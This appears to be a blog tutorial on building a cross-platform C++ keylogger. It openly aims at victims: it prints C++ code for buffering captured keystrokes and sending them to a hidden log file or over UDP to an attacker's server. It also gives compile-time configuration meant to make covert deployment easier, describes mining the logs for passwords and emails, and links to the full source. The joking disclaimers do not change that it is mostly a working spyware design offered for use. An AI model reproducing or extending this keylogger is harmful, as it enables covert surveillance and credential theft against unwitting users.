---
title: "keylogger: A Cross-Platform Keylogger"
date: 2023-11-13T11:04:37-08:00
description: "How to write a cross platform keylogger."
tags: ["cli-tools", "c++", "linux", "windows", "x11"]
---

If you're familiar with the [kbhell][1] application, you might realize that
kbhell is about 90% of the way to being a keylogger. Why not finish the job and
write a proper, cross platform keylogger that captures a victim's every
keystroke (for science reasons, of course)?

## The Requirements

So there's the obvious requirement of capturing user keystrokes. When you think
about the fact that keyboards have different layouts, there are different
language sets, etc., the task becomes challenging.

Another interesting issue that comes up is how do you record the keystrokes? You
could write it to a hidden file on the victim's PC. Yeah that works but then
you'd need a way of getting that file off their PC. Another idea is to transmit
the data over the network. If sending data over the network, what should trigger
packet transmission? Do you send when you hit some packet size threshold or do
you send data at a fixed frequency?

As an answer to these questions, this keylogger will adhere to the following
requirements:

1. Record user keystrokes that correspond to printable characters as defined by
   the currently installed C locale.
2. Support recording to a plaintext file on the victim PC.
3. Support recording to a UDP socket.
4. Support a configurable recording mode.
5. Support a configurable capture frequency.

The next sections discuss the implementation of these requirements.

## Capturing Keystrokes

The ["Keyboard Hell"][1] article gives coverage of this topic. The basic idea is
that the X11 event system on Linux and global hooks on Windows intercept
keystrokes without any noticeable effect on the rest of the system.

You can use the `kbhell` keystroke capture code in `keylogger`'s implementation.
The only difference is that instead of playing a sound bite on every keystroke,
you're pushing characters to a recorder object's character buffer. You only push
printable characters as defined by [`std::isprint`][2]. The latter detail is
limiting in that you won't be able to completely playback the victim's key
history. That said, you can still analyze the output to find passwords, emails,
usernames, etc.

## Recording Modes

Based on the initial requirements, you want to support two recording modes: text
and network. Text mode captures character data to a plaintext file on the
victim's PC. Network mode transmits the character data over the network as UDP
packets from the victim's PC to the attacker's server.

Each mode has a recorder type object implementing the `Recorder` interface:

```cpp
/*!
 * \class Recorder
 * \brief Recorder defines an interface for buffering and transmitting user
 *        keystrokes.
 */
class Recorder {
 public:
  /*!
   * \brief Construct a recorder object with a key limit of \p key_limit.
   * \param key_limit The maximum number of keys the recorder will store in
   *                  memory.
   * \throws std::runtime_error When given a zero or negative \p key_limit
   *                            value.
   */
  explicit Recorder(int key_limit);

  Recorder() = delete;
  virtual ~Recorder() = default;
  Recorder(const Recorder&) = default;
  Recorder& operator=(const Recorder&) = default;
  Recorder(Recorder&&) = default;
  Recorder& operator=(Recorder&&) = default;

  /*!
   * \brief Buffer the char \p character in memory.
   * \details Characters are buffered in memory. If the buffer limit has been
   *          reached, the buffer will be emptied via a call to Transmit() and
   *          then \p character will be added to the buffer.
   * \param character A printable character as classified by the currently
   *                  installed C locale.
   * \throws std::runtime_error When BufferKeyPress() must call Transmit() to
   *                            make room for \p character in the buffer but
   *                            Transmit() fails.
   */
  void BufferKeyPress(char character);

  /*!
   * \brief Transmit keystroke buffer contents to the recording medium.
   */
  virtual void Transmit() = 0;

 protected:
  using CharList = std::vector<char>;

  int num_keys_;  /**< Number of keystrokes currently buffered. */
  CharList keys_; /**< Keystroke char buffer. */
};
```

`Recorder` types all maintain a fixed size `char` buffer called `keys_`. On
construction, the user specifies the size of the buffer via the `key_limit`
constructor parameter. The user can add characters to the buffer via the
`BufferKeyPress()` method. When the buffer is full, `BufferKeyPress()` calls
`Transmit()` and then inserts the new character. `Transmit()` is a method
implemented by all recorder types. `Transmit()` writes buffered data to some
recording medium (for example, a text file or a socket).

As you might have guessed by now, each recording mode has an associated
`Recorder` subtype. The text file recorder has the `FileRecorder` type and the
UDP recorder has the `NetworkRecorder` type. Below is the implementation of the
text and network recorders' `Transmit()` method.

```cpp
void FileRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  /* We open and close the log file everytime Transmit() is called because we
   * want to ensure in the case the program is stopped abruptly, we will have a
   * chance at saving some keystroke data. */
  std::ofstream log_handle(log_path_.c_str(), std::ios_base::app);
  if (!log_handle) {
    throw std::runtime_error("unable to open key log file");
  }
  log_handle.write(keys_.data(), num_keys_);
  num_keys_ = 0;
}

void NetworkRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  int bytes_sent = tx_socket_.Send(keys_.data(), num_keys_);
  if (bytes_sent != num_keys_) {
    std::cerr << "warning: only" << bytes_sent << "/" << num_keys_
              << "bytes sent" << std::endl;
  }
  num_keys_ = 0;
}
```

You'll notice that `FileRecorder::Transmit()` opens and closes the file handle
each time its called. Not the most efficient method of performing file IO.
However, the comment in the code explains the reasoning. When you halt the
keylogger, there's no guarantee that the data sent via the stream gets written
to the file. Explicitly closing the file handle flushes the stream contents. In
retrospect, this would have been a good use case for using
[`std::ostream::flush`][3].

The `NetworkRecorder` uses a wrapper around a Linux/Windows UDP socket to
transmit data. You can look at the UDP wrapper [source][4] to get the full
details.

## Configuration

You might expect to pass configuration via command line args. However, when you
think about the deployment use cases for a keylogger, having to inject your
keylogger's binary plus a bunch of CLI args doesn't sound appealing. To solve
this issue, `keylogger` is compile time configurable. Below are the
configuration options:

```cpp
enum RecorderType {
  kText = 0, /* Record to text file. */
  kNetwork,  /* Record to UDP socket. */
};

/* These are essentially your program options. You want to build your options
 * into the executable to make deployment of the keylogger easier down the line
 * (i.e., you don't want to have to sneakily deploy/inject the keylogger
 * executable AND a bunch of CLI options). */

/* Recording medium. */
#define RECORDER_TYPE RecorderType::kText
/* Max number of keystrokes buffered in memory before the data is written to the
 * recorder. */
#define RECORDER_KEY_LIMIT 8
/* Keystroke log file (RecorderType::kText only). */
#define RECORDER_FILE_PATH "/home/ieg/dev/keylogger/bin/keys.txt"
/* UDP socket IPv4 address and port of the remote server collecting keystroke
 * data (RecorderType::kNetwork only). */
#define RECORDER_IP "127.0.0.1"
#define RECORDER_PORT 5555
```

The keylogger user can select their recording mode and then set options specific
to that mode. One can edit the `keylogger.cpp` file directly or pass the
relevant options to the compiler (for example, `-DRECORDER_KEY_LIMIT=256`).

Regardless of the mode selected, you must always set `RECORDER_KEY_LIMIT`.
`RECORDER_KEY_LIMIT` controls the size of the keystroke buffer and therefore the
frequency of transmission. Set this value too low and the keylogger might be a
bit too noisey (that is, produces a lot of net traffic or disk IO overhead). Set
it too high and you might not see any data transmitted. The sweet spot is up to
the attacker to decide.

## Conclusion

Below is a demo showing `keylogger` in action on a Linux system.

{{< video src="/posts/2023/keylogger/keylogger-demo.mp4" type="video/mp4" preload="auto" >}}

The project includes `key_capture.py`, a script that prints captured key data
from a remote keylogger running in network mode. During the demo, the script
captures keystrokes from the NeoVim editor.

The toughest part of developing the keylogger is by far the capture of global
keystrokes which is highly dependent on the OS and display technology in use.
Beyond that, you have to decide how to record keystrokes. Be responsible with
how you use this or any keylogger!

The complete project source with build instructions, usage, etc. is available on
GitHub under [keylogger][7].

[1]: https://programmador.com/posts/2023/keyboard-hell/
[2]: https://en.cppreference.com/w/cpp/string/byte/isprint
[3]: https://en.cppreference.com/w/cpp/io/basic_ostream/flush
[4]: https://github.com/ivan-guerra/keylogger/blob/master/include/io/udp/udp_socket.h
[5]: https://github.com/ivan-guerra/keylogger/blob/master/src/io/udp/linux_udp_socket.cpp
[6]: https://github.com/ivan-guerra/keylogger/blob/master/src/io/udp/windows_udp_socket.cpp
[7]: https://github.com/ivan-guerra/keylogger.git
